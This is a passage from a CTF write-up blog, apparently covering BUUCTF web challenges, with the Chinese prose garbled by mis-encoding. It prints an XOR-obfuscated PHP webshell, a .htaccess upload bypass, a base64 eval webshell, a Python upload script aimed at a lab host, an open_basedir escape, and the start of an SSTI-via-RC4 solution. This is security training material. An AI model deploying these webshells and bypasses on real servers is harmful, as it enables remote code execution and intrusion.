</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$hhh</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿‡æ»¤äº†å–åç¬¦å·ï¼Œåªèƒ½å¼‚æˆ–æ¥ç»•è¿‡å†™webshell</p>
<p>å¼‚æˆ–è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">finds</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$a</span><span class="o">=</span><span class="p">[</span><span class="mi">33</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">64</span><span class="p">,</span><span class="mi">92</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">134</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">136</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">140</span><span class="p">,</span><span class="mi">141</span><span class="p">,</span><span class="mi">142</span><span class="p">,</span><span class="mi">143</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">146</span><span class="p">,</span><span class="mi">147</span><span class="p">,</span><span class="mi">148</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">151</span><span class="p">,</span><span class="mi">152</span><span class="p">,</span><span class="mi">153</span><span class="p">,</span><span class="mi">154</span><span class="p">,</span><span class="mi">155</span><span class="p">,</span><span class="mi">156</span><span class="p">,</span><span class="mi">157</span><span class="p">,</span><span class="mi">158</span><span class="p">,</span><span class="mi">159</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">161</span><span class="p">,</span><span class="mi">162</span><span class="p">,</span><span class="mi">163</span><span class="p">,</span><span class="mi">164</span><span class="p">,</span><span class="mi">165</span><span class="p">,</span><span class="mi">166</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">168</span><span class="p">,</span><span class="mi">169</span><span class="p">,</span><span class="mi">170</span><span class="p">,</span><span class="mi">171</span><span class="p">,</span><span class="mi">172</span><span class="p">,</span><span class="mi">173</span><span class="p">,</span><span class="mi">174</span><span class="p">,</span><span class="mi">175</span><span class="p">,</span><span class="mi">176</span><span class="p">,</span><span class="mi">177</span><span class="p">,</span><span class="mi">178</span><span class="p">,</span><span class="mi">179</span><span class="p">,</span><span class="mi">180</span><span class="p">,</span><span class="mi">181</span><span class="p">,</span><span class="mi">182</span><span class="p">,</span><span class="mi">183</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">185</span><span class="p">,</span><span class="mi">186</span><span class="p">,</span><span class="mi">187</span><span class="p">,</span><span class="mi">188</span><span class="p">,</span><span class="mi">189</span><span class="p">,</span><span class="mi">190</span><span class="p">,</span><span class="mi">191</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">193</span><span class="p">,</span><span class="mi">194</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">196</span><span class="p">,</span><span class="mi">197</span><span class="p">,</span><span class="mi">198</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">200</span><span class="p">,</span><span class="mi">201</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">203</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">205</span><span class="p">,</span><span class="mi">206</span><span class="p">,</span><span class="mi">207</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">209</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">211</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">213</span><span class="p">,</span><span class="mi">214</span><span class="p">,</span><span class="mi">215</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">218</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">220</span><span class="p">,</span><span class="mi">221</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">223</span><span class="p">,</span><span class="mi">224</span><span class="p">,</span><span class="mi">225</span><span class="p">,</span><span class="mi">226</span><span class="p">,</span><span class="mi">227</span><span class="p">,</span><span class="mi">228</span><span class="p">,</span><span class="mi">229</span><span class="p">,</span><span class="mi">230</span><span class="p">,</span><span class="mi">231</span><span class="p">,</span><span class="mi">232</span><span class="p">,</span><span class="mi">233</span><span class="p">,</span><span class="mi">234</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">236</span><span class="p">,</span><span class="mi">237</span><span class="p">,</span><span class="mi">238</span><span class="p">,</span><span class="mi">239</span><span class="p">,</span><span class="mi">240</span><span class="p">,</span><span class="mi">241</span><span class="p">,</span><span class="mi">242</span><span class="p">,</span><span class="mi">243</span><span class="p">,</span><span class="mi">244</span><span class="p">,</span><span class="mi">245</span><span class="p">,</span><span class="mi">246</span><span class="p">,</span><span class="mi">247</span><span class="p">,</span><span class="mi">248</span><span class="p">,</span><span class="mi">249</span><span class="p">,</span><span class="mi">250</span><span class="p">,</span><span class="mi">251</span><span class="p">,</span><span class="mi">252</span><span class="p">,</span><span class="mi">253</span><span class="p">,</span><span class="mi">254</span><span class="p">,</span><span class="mi">255</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">27</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">27</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nx">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$x</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">			<span class="k">for</span><span class="p">(</span><span class="nv">$k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$k</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span><span class="nv">$k</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">					<span class="k">echo</span> <span class="nv">$string</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="k">echo</span> <span class="s1">&#39;%&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;^%&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="nv">$index</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span><span class="nv">$index</span> <span class="o">==</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">						<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">finds</span><span class="p">(</span><span class="s2">&#34;_GET&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?.=${%80%80%80%80^%DF%C7%C5%D4}{%81}();&amp;%81=phpinfo
</span></span><span class="line"><span class="cl">//è¿™é‡Œ.å’Œ_ä¸€æ ·çš„
</span></span></code></pre></td></tr></table>
</div>
</div><p>éé¢„æœŸæ˜¯ç›´æ¥æœflagå°±å‡ºæ¥äº†</p>
<p>é¢„æœŸè§£åˆ©ç”¨get_the_flagå‡½æ•°</p>
<p>æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†è¿‡æ»¤äº†æ‹“å±•åphï¼Œè€Œä¸”æŠŠ&lt;?è¿‡æ»¤äº†ï¼Œä½†æ˜¯php7ä¸èƒ½ç”¨scriptæ ‡ç­¾ç»•è¿‡äº†</p>
<p><code>exif_imagetype</code>ä¸èƒ½ç®€å•ç”¨GIF89aç»•è¿‡äº†ï¼Œè¿™é‡Œå¯ä»¥åœ¨.htaccessæ·»åŠ æ–‡ä»¶å¤´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#define width 1
</span></span><span class="line"><span class="cl">#define height 1
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æˆ–è€…åœ¨.htaccesså‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)
</span></span><span class="line"><span class="cl">x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´
</span></span><span class="line"><span class="cl">.htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨<code>php_value auto_append_file</code>æŒ‡å®šæ–‡ä»¶åŒ…å«ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨base64æ¥è¿›è¡Œç»•è¿‡&lt;?æ ‡ç­¾é™åˆ¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#define width 1
</span></span><span class="line"><span class="cl">#define height 1
</span></span><span class="line"><span class="cl">AddType application/x-httpd-php .jpg
</span></span><span class="line"><span class="cl">php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=./1.jpg&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶ååœ¨1.jpgé‡Œé¢å†™å…¥base64çš„é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89abb
</span></span><span class="line"><span class="cl">PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå› ä¸ºbase64è§£å¯†æ˜¯4ä½ä¸€è§£ç ï¼Œæˆ‘ä»¬è¡¥ä¸Šä¸¤ä¸ªbå‡‘å››ä½</p>
<p>åˆ©ç”¨è„šæœ¬ä¸Šä¼ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">htaccess</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">#define width 1337
</span></span></span><span class="line"><span class="cl"><span class="s2">#define height 1337 
</span></span></span><span class="line"><span class="cl"><span class="s2">AddType application/x-httpd-php .jpg
</span></span></span><span class="line"><span class="cl"><span class="s2">php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=./shell.jpg&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;GIF89abbPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://0e57dfd9-bd66-4101-8c76-8baa918b86bb.node5.buuoj.cn:81/?_=${</span><span class="si">%86%</span><span class="s2">86</span><span class="si">%86%</span><span class="s2">86^</span><span class="si">%d</span><span class="s2">9</span><span class="si">%c</span><span class="s2">1</span><span class="si">%c</span><span class="s2">3</span><span class="si">%d</span><span class="s2">2}{%86}();&amp;%86=get_the_flag&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:(</span><span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span><span class="n">htaccess</span><span class="p">,</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;upload&#34;</span><span class="p">:</span><span class="s2">&#34;Submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:(</span><span class="s1">&#39;shell.jpg&#39;</span><span class="p">,</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‡ºæ¥è·¯å¾„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">upload</span><span class="o">/</span><span class="n">tmp_fc3f8d0d99ccdde85c8cfc624fe94c32</span><span class="o">/.</span><span class="n">htaccess</span>
</span></span><span class="line"><span class="cl"><span class="n">upload</span><span class="o">/</span><span class="n">tmp_fc3f8d0d99ccdde85c8cfc624fe94c32</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>èšå‰‘è¿æ¥æ’ä»¶ç»•è¿‡</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405003120497.png"
	width="1284"
	height="870"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405003120497_hu17814701339037755575.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405003120497_hu5456182209726558398.png 1024w"
	loading="lazy"
	
		alt="image-20250405003120497"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<p>æˆ–è€…å†™æ–‡ä»¶æ¥è¯»æ ¹ç›®å½•ä¸‹æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¯»åˆ°ä¹‹å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/THis_Is_tHe_F14g&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-åä¸œå—èµ›åŒºdouble-secret">[CISCN2019 åä¸œå—èµ›åŒº]Double Secret
</h2><p>ç›®å½•æ‰«ææ‰«å‡º/console</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405134111628.png"
	width="1906"
	height="839"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405134111628_hu9036054098883809945.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405134111628_hu2275185277405147910.png 1024w"
	loading="lazy"
	
		alt="image-20250405134111628"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<p>å¾—ç®—pinç äº†ï¼Œä½†æ˜¯ä¿¡æ¯ä¸å¤Ÿ</p>
<p>å›åˆ°åŸæ¥ç•Œé¢ï¼Œè®¿é—®/secretè·¯ç”±</p>
<p>ä¼ å‚secretï¼Œå‡ºç°æŠ¥é”™</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405135959717.png"
	width="1339"
	height="520"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405135959717_hu5254101068254404053.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405135959717_hu12949540666531859052.png 1024w"
	loading="lazy"
	
		alt="image-20250405135959717"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="618px"
	
></p>
<p>rc4åŠ å¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if(secret==None):
</span></span><span class="line"><span class="cl">       return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
</span></span><span class="line"><span class="cl">   rc=rc4_Modified.RC4(&#34;HereIsTreasure&#34;)   #è§£å¯†
</span></span><span class="line"><span class="cl">   deS=rc.do_crypt(secret)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   a=render_template_string(safe(deS))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   if &#39;ciscn&#39; in a.lower():
</span></span><span class="line"><span class="cl">       return &#39;flag detected!&#39;
</span></span><span class="line"><span class="cl">   return a
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“sstiç„¶åç”¨rc4åŠ å¯†ï¼Œç”¨cyberchefåŠ å¯†</p>
<p>æˆ–è€…ä¸Šè„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_main</span><span class="p">(</span><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;init_key&#34;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;init_message&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;RC4åŠ å¯†ä¸»å‡½æ•°&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_box</span> <span class="o">=</span> <span class="n">rc4_init_sbox</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">crypt</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">rc4_excrypt</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">s_box</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="n">crypt</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_init_sbox</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_box</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;åŸæ¥çš„ s ç›’ï¼š%s&#34; % s_box)</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">s_box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">s_box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">s_box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">s_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;æ··ä¹±åçš„ s ç›’ï¼š%s&#34;% s_box)</span>
